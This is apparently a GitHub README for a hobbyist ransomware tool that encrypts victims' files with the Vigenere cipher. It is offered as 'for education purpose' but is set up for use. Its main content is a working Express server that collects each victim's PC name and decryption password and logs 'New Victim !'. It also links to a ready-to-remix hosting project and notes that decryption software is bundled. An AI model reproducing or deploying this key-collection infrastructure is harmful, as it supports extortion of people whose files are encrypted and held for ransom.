# REVENGE RANSOMEWARE
a vigenere encrypt ransomeware by me :p, for education purpose.
**MAKE SURE TO STAR THE PROJECT :)**

# Used Algorithm
- Vigenere

# NOTE
i didnt try this fully, so try it on virtual machine to make sure it works perfectly, If you encounter any problems tell me in [issues](https://github.com/Bowlingtoolkit/Vigenere-Ransomeware/issues)
also i created this only for *education purpose* .


# Express Node.js Server (To Get The Password For Decrypt) Example:
```js
const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const app = express();

app.use(express.static("public"));
app.use(bodyParser.json())
//url.com/new
app.post('/new', (req, res) => {
  var pcname = req.body.user;
  var password = req.body.pass;

  var createStream = fs.createWriteStream(`public/${pcname}.txt`);
  createStream.end();
  
  fs.writeFile(`./public/${pcname}.txt`, `password=${password}`, (err) => {
    if(err) return console.log(err);
    console.log("New Victim !")
  });
  res.send("done")
})

const listener = app.listen(3000, () => {
  console.log("Your app is listening on port 3000");
});
 
```
- You can use [glitch.com](https://glitch.com) to create projects to get the decrypt password, if you want fresh project [clickhere](https://glitch.com/edit/#!/remix/revenge-ransome)


[Virustotal Scan Result](https://www.virustotal.com/gui/file/acf5c8c6b8658cf20e78a2a812db79dbd67ce65992dd0f5f6353962fec94a02c/detection)


# Change Log:
- Now includes the decryption software :) 


![decryptsoftware](https://i.top4top.io/p_1604d9ahl1.png)
